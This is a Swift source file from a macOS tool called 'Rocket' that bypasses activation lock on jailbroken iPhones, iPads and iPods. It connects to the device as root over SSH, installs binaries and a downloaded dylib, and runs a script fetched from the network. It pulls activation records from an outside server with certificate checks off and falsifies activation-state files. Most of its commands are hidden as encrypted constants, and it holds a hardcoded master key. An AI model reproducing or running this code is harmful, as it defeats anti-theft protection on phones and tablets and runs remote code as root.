//
//  ViewController.swift
//  Rocket
//
//  Created by Abraham Rubio on 29/07/20.
//  Copyright © 2020 sfish. All rights reserved.
//

import Cocoa
import RNCryptor
import Alamofire

class GSMViewController: NSViewController {

    private let sf = ShellFull()
    
    @IBOutlet var NSVisualOutlet: NSTextField!
    @IBOutlet weak var serialLabel: NSTextField!
    @IBOutlet weak var actLabel: NSTextField!
    @IBOutlet weak var bypassBT: NSButton!
    
    private var shellSSH : String = ""
    private var shellSCP : String = ""
    private var serialNumber : String = ""
    private var serialNumberClear : String = ""
    private var actState = ""
    private let masterKey = "23kQYStGZMB7hRuCgpPTyNKc4eB6nU"
    private var pressCount = 0
    private var timer = Timer()
    
    override func viewWillAppear() {
        super.viewWillAppear()
        //Adds transparency to the app
        NSVisualOutlet.window?.isOpaque = false
        NSVisualOutlet.window?.alphaValue = 0.98
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.serialLabel.isSelectable = true
        do {
            let enc = try encryptMessage(message: "fuck you", encryptionKey: Constants.HTTP_BEARER)
            print("ENC[\(enc)]")

            let dec = try decryptMessage(encryptedMessage: enc, encryptionKey: Constants.HTTP_BEARER)
            print("DEC[\(dec)]")
        }
        catch{
            print("ErrorHR4U4RU4R")
        }

        
        do {
            shellSSH = try decryptMessage(encryptedMessage: Constants.SHELL_SSH, encryptionKey: Constants.HTTP_BEARER)
            shellSCP = try decryptMessage(encryptedMessage: Constants.SHELL_CP, encryptionKey: Constants.HTTP_BEARER)
        }
        catch {
            print("Error91JE9DD")
        }
        
        runUSBListener()
        
        // Do any additional setup after loading the view.
    }

    override var representedObject: Any? {
        didSet {
        // Update the view, if already loaded.
        }
    }
    
    @IBAction func homeButton(_ sender: NSButton) {
        self.dismiss(self)
    }
    
    @IBAction func rocketButton(_ sender: NSButton) {
        if (pressCount == 7){
            dialogOKCancel(question: "Keep updated at", text: "https://twitter.com/Abraham48187293", style: .informational)
            pressCount = 0
        }
        else {
            pressCount = pressCount + 1
        }
    }

    @IBAction func bypassButton(_ sender: NSButton) {
        bypassBT.isEnabled = false
        
        if(serialNumber.count == 12){
            verSerial()
        }
        bypassBT.isEnabled = true
    }
    
    
    func bypass(){
        sf.shellFull(constParser(const: Constants.KLL_PR))
        sf.shellFull(constParser(const: Constants.KLL_MW))
        sf.shellFull(constParser(const: Constants.KLL_MP))
        sf.shellFull(constParser(const: Constants.KLL_BRP))
        sf.shellFull("rm ~/.ssh/known_hosts")
        sf.shellFull("/usr/local/bin/iproxy 2222 44 &>/dev/null &")
        
        
        let fileURLBi = Bundle.main.url(forResource: "bootb", withExtension: "tar.gz")
        let bootb: String = fileURLBi!.path
        
        let fileURLDy = Bundle.main.url(forResource: "bootd", withExtension: "tar.gz")
        let bootd: String = fileURLDy!.path
        
        let fileURLCy = Bundle.main.url(forResource: "boot", withExtension: "tar.lzma")
        let bootc: String = fileURLCy!.path
        
        /* Verificamos si tenemos jailbreak*/
        let (jailbroken, error) = sf.shellFull(shellSSH + "uname")
        print("*error[" + error + "]")
        if(error.contains("ssh_exchange_identification") || error.contains("Connection reset by peer")){
            dialogOKCancel(question: "Jailbreak Not Detected", text: "Please make sure it's a Jailbroken device", style: .critical)
        }
        else if(jailbroken.contains("Darwin")){
            print("*jailbroken[TRUE]")

            sf.shellFull("/usr/local/bin/idevicepair pair")
            sf.shellFull("/usr/local/bin/ideviceactivation deactivate")
            sf.shellFull(shellSSH + "mount -o rw,union,update /" + " &>/dev/null &")
            
            /* SNAPPY RENAME*/
            let (snapName, _) = sf.shellFull(shellSSH + "snappy -f / -l | sed -n 2p")
            sf.shellFull(shellSSH + "snappy -f / -r \(snapName) --to orig-fs &>/dev/null &")
            //print("*snapName[\(snapName)]")

            /* USE RAPTOR*/
            sf.shellFull(shellSSH + constParser(const: Constants.CP_PEM))
            
            let (scpConn, errorConn) = sf.shellFull(shellSCP + bootb + " root@localhost:/var/root/bootb.tar.gz")
            if(scpConn.contains("Permission denied") || errorConn.contains("Permission denied")){
                dialogOKCancel(question: "Communication Error", text: "Permission denied, please disconnect/connect and try again", style: .critical)
            }else{
                sf.shellFull(constParser(const: Constants.SHELL_SSH) + "rm /boot.tar")
                /* DYLIBS & BINARIES*/
                print("*fairPlaySignature[VALID]")
                sf.shellFull(shellSCP + bootb + " root@localhost:/var/root/bootb.tar.gz")
                sf.shellFull(shellSCP + bootd + " root@localhost:/var/root/bootd.tar.gz")
                sf.shellFull(shellSSH + "tar zxvf /var/root/bootb.tar.gz --directory /usr/bin")
                sf.shellFull(shellSSH + "tar zxvf /var/root/bootd.tar.gz --directory /usr/lib")
                sf.shellFull(shellSSH + "rm /var/root/bootb.tar.gz /var/root/bootd.tar.gz")
                
                /* SUBSTRATE*/
                print("*lockdowndPatch[PROC]")
                sf.shellFull(shellSCP + bootc + " root@localhost:/boot.tar.lzma")
                sf.shellFull(shellSSH + "chmod +x /usr/bin/lzma")
                sf.shellFull(constParser(const: Constants.SHELL_SSH) + "lzma -d -v /boot.tar.lzma")
                sf.shellFull(shellSSH + "tar -C / -xvf /boot.tar")
                
                /* GET ROCKET DYLIB */
                sf.shellFull(shellSSH + constParser(const: Constants.WGT_RCK_DLB))
                sf.shellFull(shellSSH + constParser(const: Constants.WGT_RCK_PLST))

                /* CHMOD 777 & +X ROCKET DYLIB */
                sf.shellFull(shellSSH + constParser(const: Constants.CHM_777_RCK))
                sf.shellFull(shellSSH + constParser(const: Constants.CHM_MSX_RCK))
                
                /* 2 EXEC SUBSTRATE */
                sf.shellFull(shellSSH + "/usr/libexec/substrate")
                sf.shellFull(shellSSH + "/usr/libexec/substrated")
                
                /* ACTIVATION*/
                print("*drmHandshake[SUCCESS]")
                //26032021sf.shellFull("/usr/local/bin/ideviceactivation activate -s " + constParser(const: Constants.SRV_ACT))// + " &>/dev/null")
                
                sf.shellFull("/usr/local/bin/ideviceactivation activate -s https://jarvix.ru/active/sales/pqHdDVx4E4js65pj.php")// + " &>/dev/null")
                
                /* FINDING ARK PATH*/
                let ark = shell(shellSSH + constParser(const: Constants.FND_ARK))
                let guid = ark.slice(from: "System/", to: "/Library")
                let library = "/private/var/containers/Data/System/" + guid! + "/Library"
                //print("*arkPath[\(ark)]")
                //print("*guidPath[\(guid)]")
                //print("*libraryPath[\(library)]")
                
                /* GET ACT FILES*/
                //print("cp: /private/var/root/Library/Preferences/com.apple.MobileBackup.plist")
                //sf.shellFull(shellSSH + constParser(const: Constants.WGT_INE_SRL) + serialNumber + "/generic.xml -O /tmp/generic.xml")
                //sf.shellFull(shellSSH + constParser(const: Constants.WGT_INE_SRL) + serialNumber + "/activation_record.plist -O /tmp/activation_record.plist")
                
                /* GET ACT FILES*/
                print("cp: /private/var/root/Library/Preferences/com.apple.MobileBackup.plist")
                let (telCap, _) = sf.shellFull("/usr/local/bin/ideviceinfo -k TelephonyCapability")
                let wgetAct = "wget -q --no-check-certificate https://jarvix.ru/active/sales/d530gc7n/i27pgcce/"
                
                
                if(telCap.contains("true")){
                    sf.shellFull(shellSSH + wgetAct + serialNumber + "/generic.xml -O /tmp/generic.xml")
                    let (devClass, _) = sf.shellFull("/usr/local/bin/ideviceinfo -k DeviceClass")
                    
                    if(devClass.contains("iPhone")){
                        sf.shellFull(shellSSH + wgetAct + serialNumber + "/activation_record.plist -O /tmp/activation_record.plist")
                    }
                    else if(devClass.contains("iPad")){
                        sf.shellFull(shellSSH + constParser(const: Constants.WGT_IAD_SRL) + serialNumber + "/activation_record.plist -O /tmp/activation_record.plist")
                    }
                    
                }
                
                
//                if(telCap.contains("true")){
//                    sf.shellFull(shellSSH + constParser(const: Constants.WGT_INE_SRL) + serialNumber + "/generic.xml -O /tmp/generic.xml")
//                    let (devClass, _) = sf.shellFull("/usr/local/bin/ideviceinfo -k DeviceClass")
//
//                    if(devClass.contains("iPhone")){
//                        sf.shellFull(shellSSH + constParser(const: Constants.WGT_INE_SRL) + serialNumber + "/activation_record.plist -O /tmp/activation_record.plist")
//                    }
//                    else if(devClass.contains("iPad")){
//                        sf.shellFull(shellSSH + constParser(const: Constants.WGT_IAD_SRL) + serialNumber + "/activation_record.plist -O /tmp/activation_record.plist")
//                    }
//
//                }
                else if (telCap.contains("false")){
                    let (devClass, _) = sf.shellFull("/usr/local/bin/ideviceinfo -k DeviceClass")
                    
                    switch devClass {
                    case "iPad":
                        sf.shellFull(shellSSH + constParser(const: Constants.WGT_IAD_SRL) + serialNumber + "/activation_record.plist -O /tmp/activation_record.plist")
                    case "iPod":
                        sf.shellFull(shellSSH + constParser(const: Constants.WGT_IOD_SRL) + serialNumber + "/activation_record.plist -O /tmp/activation_record.plist")
                    default:
                        dialogOKCancel(question: "DEVICE NOT COMPATIBLE", text: "YOUR DEVICE IS NOT COMPATIBLE", style: .critical)
                    }
                }
                
                
                
                /* CONVERT XML TO PLSIT*/
                sf.shellFull(shellSSH + "plistutil -i /tmp/generic.xml -o /tmp/generic.plist -f bin")
                sf.shellFull(shellSSH + "rm /tmp/generic.xml")
                
                /* MOD DATA_ARK*/
                print("*mobileactivationd[HOOKED]")
                let tmpDir = shell("mktemp -d")
                sf.shellFull(shellSCP + "root@localhost:\(ark) \(tmpDir)")
                sf.shellFull("chmod 777 \(tmpDir)/data_ark.plist")
                sf.shellFull("plutil -replace -ActivationState -string Activated \(tmpDir)/data_ark.plist")
                sf.shellFull("plutil -replace -BrickState -bool NO \(tmpDir)/data_ark.plist")
                sf.shellFull(shellSCP + "\(tmpDir)/data_ark.plist root@localhost:/tmp/data_ark.plist")
                
                
                /* PROC COMM*/
                print("rm: /private/var/root/.obliterated")
                sf.shellFull(shellSSH + "chmod 644 /tmp/generic.plist")
                sf.shellFull(shellSSH + "chflags nouchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist")
                sf.shellFull(shellSSH + "mv -f /tmp/generic.plist /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist")
                sf.shellFull(shellSSH + "chmod 755 /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist")
                sf.shellFull(shellSSH + "chflags uchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist")
                
                /* PROC ACT RECORDS*/
                print("chflags: /private/var/preferences/SystemConfiguration/com.apple.networkidentification.plist")
                sf.shellFull(shellSSH + "mkdir " + library + constParser(const: Constants.ACT_REC_FOL) + " &>/dev/null &")
                sf.shellFull(shellSSH + "chmod 644 /tmp/activation_record.plist")
                sf.shellFull(constParser(const: Constants.SHELL_SSH) + "chflags nouchg " + library + constParser(const: Constants.ACT_PLS))
                sf.shellFull(shellSSH + "mv -f /tmp/activation_record.plist " + library + constParser(const: Constants.ACT_PLS))
                sf.shellFull(shellSSH + "chmod 755 " + library + constParser(const: Constants.ACT_PLS))
                sf.shellFull(shellSSH + "chflags uchg " + library + constParser(const: Constants.ACT_PLS))
                
                /* PROC DATA_ARK*/
                print("*mobilegestalt[RUNNING]")
                sf.shellFull(shellSSH + "chmod 644 /tmp/data_ark.plist")
                sf.shellFull(shellSSH + "chflags nouchg " + ark)
                sf.shellFull(shellSSH + "mv -f /tmp/data_ark.plist " + ark)
                sf.shellFull(shellSSH + "chmod 755 " + ark)
                sf.shellFull(shellSSH + "chflags uchg " + ark)
                
                /* EXEC SUBSTRATE */
                sf.shellFull(shellSSH + "/usr/libexec/substrate")
                sf.shellFull(shellSSH + "/usr/libexec/substrated")
                
                
                /* RELOAD COMMD & MAD*/
                sf.shellFull(constParser(const: Constants.SHELL_SSH) + constParser(const: Constants.UNLOAD_COMM))
                sf.shellFull(constParser(const: Constants.SHELL_SSH) + constParser(const: Constants.LOAD_COMM))
                sf.shellFull(constParser(const: Constants.SHELL_SSH) + constParser(const: Constants.UNLOAD_MAD))
                sf.shellFull(constParser(const: Constants.SHELL_SSH) + constParser(const: Constants.LOAD_MAD))
                
                /* RESPRING */
                sf.shellFull(shellSSH + "killall -9 SpringBoard")
                
                /* LDRESTART */
                //shell(shellSSH + "ldrestart")
                //shell(shellSSH + "reboot")
                
                /* RELOAD ALL*/
                sf.shellFull(shellSSH + constParser(const: Constants.WGT_RLAD_SH))
                sf.shellFull(shellSSH + "bash /tmp/reload.sh")
                
                /*CLEANUP*/
                sf.shellFull("rm -rf \(tmpDir)")
                //shell(shellSSH + "rm /boot.tar")
                //shell(shellSSH + "rm /Library/MobileSubstrate/DynamicLibraries/rocket.*")
                
                
                /* KILL IPROXY*/
                sf.shellFull(constParser(const: Constants.KLL_PR))
                sf.shellFull("/usr/local/bin/idevicepair pair")
                
                dialogOKCancel(question: "Bypass DONE", text: "Please Retweet your results. Enjoy", style: .informational)
            }
            
        }
        else{
            dialogOKCancel(question: "Connection Error", text: "There has been a communication error: Error9N38SG59", style: .critical)
        }
        
    }
    
    func constParser(const : String) -> String{
        var constClear = ""
        do {
            constClear = try decryptMessage(encryptedMessage: const, encryptionKey: Constants.HTTP_BEARER)
        }
        catch {
            print("Error8JRF398R")
        }
        return constClear
    }
    
    func dialogOKCancel(question: String, text: String, style: NSAlert.Style) {
        
        let alert = NSAlert()
        alert.messageText = question
        alert.informativeText = text
        alert.addButton(withTitle: "OK")
        alert.alertStyle = style
        alert.beginSheetModal(for: self.view.window!)
        
    }
    
    func shell(_ command: String) -> String {
        let task = Process()
        task.launchPath = "/bin/bash"
        task.arguments = ["-c", command]

        let pipe = Pipe()
        task.standardOutput = pipe
        task.launch()

        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        let output: String = NSString(data: data, encoding: String.Encoding.utf8.rawValue)! as String
        task.waitUntilExit()
        return output.trimmingCharacters(in: .newlines)

    }
    
    func shellFull(_ command: String) -> (String, String) {
        let task = Process()
        task.launchPath = "/bin/bash"
        task.arguments = ["-c", command]

        let outputQueue = DispatchQueue(label: "bash-output-queue")
        
        var outputData = Data()
        var errorData = Data()

        let outputPipe = Pipe()
        task.standardOutput = outputPipe

        let errorPipe = Pipe()
        task.standardError = errorPipe
        
        outputPipe.fileHandleForReading.readabilityHandler = { handler in
            outputQueue.async {
                let data = handler.availableData
                outputData.append(data)
            }
        }

        errorPipe.fileHandleForReading.readabilityHandler = { handler in
            outputQueue.async {
                let data = handler.availableData
                errorData.append(data)
            }
        }
        
        task.launch()
        task.waitUntilExit()
        
        outputPipe.fileHandleForReading.readabilityHandler = nil
        errorPipe.fileHandleForReading.readabilityHandler = nil

        return (outputData.shellOutput(), errorData.shellOutput())
    }
    
    func verSerial(){
        //print("*serialNumber[\(serialNumber.count)]")
        //print("PARAMS[" + masterKey + "][" + serialNumber + "]")
        let parameters = ["masterkey": masterKey, "masterserial": serialNumber]
        AF.request(constParser(const: Constants.SRV_VER), parameters: parameters).responseString { response in
            //print("response: \(response)")
            switch response.result {
            case .success(let value):
                if value.contains("SUCCX999"){
                    print("*prepare[SUCCESS]")
                    self.bypass()
                }else {
                    print("*prepare[FAILED]")
                    self.dialogOKCancel(question: "SERIAL NOT REGISTERED", text: "Please register in https://sw0rdf1sh.mx/", style: .critical)
                }
            case .failure(let error):
                print(error)
            }
        }
    }
    
    func runUSBListener(){
        // Scheduling timer to Call the function "usbList" with the interval of 1 seconds
        timer = Timer.scheduledTimer(timeInterval: 1, target: self, selector: #selector(self.usbListener), userInfo: nil, repeats: true)
    }
    
    @objc func usbListener(){
        //self.serialNumber = self.shell("/usr/local/bin/ideviceinfo -k SerialNumber")
        
        let (connected, error) = sf.shellFull("/usr/local/bin/ideviceinfo -k SerialNumber")
        self.serialNumber = connected
        if(connected.count == 12){
            print("*serialNumber[" + self.serialNumber + "]")
            (self.actState, _) = sf.shellFull("/usr/local/bin/ideviceinfo -k ActivationState")
            self.serialLabel.stringValue = "SerialNumber: " + self.serialNumber
            self.actLabel.stringValue = "ActivationState: " + self.actState
            self.bypassBT.isEnabled = true
        }else{
            print("*serialError[" + error + "]")
            self.serialLabel.stringValue = "Error Conecting to iDevice"
            self.actLabel.stringValue = error
            self.bypassBT.isEnabled = false
        }
        
    }
    
    
    func generateEncryptionKey(withPassword password:String) throws -> String {
        let randomData = RNCryptor.randomData(ofLength: 32)
        let cipherData = RNCryptor.encrypt(data: randomData, withPassword: password)
        return cipherData.base64EncodedString()
    }

    func encryptMessage(message: String, encryptionKey: String) throws -> String {
        let messageData = message.data(using: .utf8)!
        let cipherData = RNCryptor.encrypt(data: messageData, withPassword: encryptionKey)
        return cipherData.base64EncodedString()
    }

    func decryptMessage(encryptedMessage: String, encryptionKey: String) throws -> String {

        let encryptedData = Data.init(base64Encoded: encryptedMessage)!
        let decryptedData = try RNCryptor.decrypt(data: encryptedData, withPassword: encryptionKey)
        let decryptedString = String(data: decryptedData, encoding: .utf8)!

        return decryptedString
    }
    
    func realBypass(){
        print("getting root")
        print("host: localhost, port: 2222")
        print("ssh.authenticate[username: root, password: alpine]")
        print("execute.[chmod 777 /etc/sudoers]")
        print("execute.[chmod 777 /etc/sudoers]")
        print("sftp.upload[localURL: sudoers, remotePath: /var/mobile/Media/Downloads/]")
        print("rm ~/.ssh/known_host")
        print("/usr/local/bin/sshpass -p alpine scp -rP 2222 -o StrictHostKeyChecking=no -p /tmp/FactoryActivation.pem root@localhost:/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/iPhoneActivation.pem")
    }
    
}

private extension Data {
    func shellOutput() -> String {
        guard let output = String(data: self, encoding: .utf8) else {
            return ""
        }

        guard !output.hasSuffix("\n") else {
            let endIndex = output.index(before: output.endIndex)
            return String(output[..<endIndex])
        }

        return output

    }
}

public extension String {
  subscript(value: Int) -> Character {
    self[index(at: value)]
  }
}

public extension String {
  subscript(value: NSRange) -> Substring {
    self[value.lowerBound..<value.upperBound]
  }
}

public extension String {
  subscript(value: CountableClosedRange<Int>) -> Substring {
    self[index(at: value.lowerBound)...index(at: value.upperBound)]
  }

  subscript(value: CountableRange<Int>) -> Substring {
    self[index(at: value.lowerBound)..<index(at: value.upperBound)]
  }

  subscript(value: PartialRangeUpTo<Int>) -> Substring {
    self[..<index(at: value.upperBound)]
  }

  subscript(value: PartialRangeThrough<Int>) -> Substring {
    self[...index(at: value.upperBound)]
  }

  subscript(value: PartialRangeFrom<Int>) -> Substring {
    self[index(at: value.lowerBound)...]
  }
}

private extension String {
  func index(at offset: Int) -> String.Index {
    index(startIndex, offsetBy: offset)
  }
}

extension String {
    func slice(from: String, to: String) -> String? {
        return (range(of: from)?.upperBound).flatMap { substringFrom in
            (range(of: to, range: substringFrom..<endIndex)?.lowerBound).map { substringTo in
                String(self[substringFrom..<substringTo])
            }
        }
    }
}
